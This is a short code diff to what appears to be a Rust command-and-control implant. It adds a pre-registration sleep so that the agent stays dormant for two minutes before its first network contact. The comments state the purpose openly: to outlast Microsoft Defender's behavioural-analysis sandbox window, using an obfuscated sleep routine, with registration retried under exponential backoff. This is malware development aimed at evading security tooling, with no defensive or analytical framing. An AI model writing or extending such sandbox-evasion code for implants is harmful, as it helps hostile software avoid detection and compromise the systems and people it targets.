@@ -66,6 +66,17 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
         ephemeral_pub: String::new(), // ECDH in Phase 2
     };
 
+    // Anti-sandbox: sleep before first contact so Defender's behavioral analysis
+    // sandbox times out before the agent makes any network connection.
+    // sandbox_evasion=true → 2-minute pre-registration sleep (outlasts ~60s sandbox window)
+    // sandbox_evasion=false → normal sleep_ms (still adds jitter before first contact)
+    {
+        let pre_sleep_ms = if cfg.sandbox_evasion { 120_000 } else { cfg.sleep_ms };
+        crate::dbg_log!("pre-registration sleep {}ms (sandbox_evasion={})", pre_sleep_ms, cfg.sandbox_evasion);
+        evasion::obfuscated_sleep(pre_sleep_ms, &cfg.sleep_obf).await;
+        crate::dbg_log!("pre-registration sleep done");
+    }
+
     // Retry registration with exponential backoff
     let mut backoff = 1u64;
     loop {
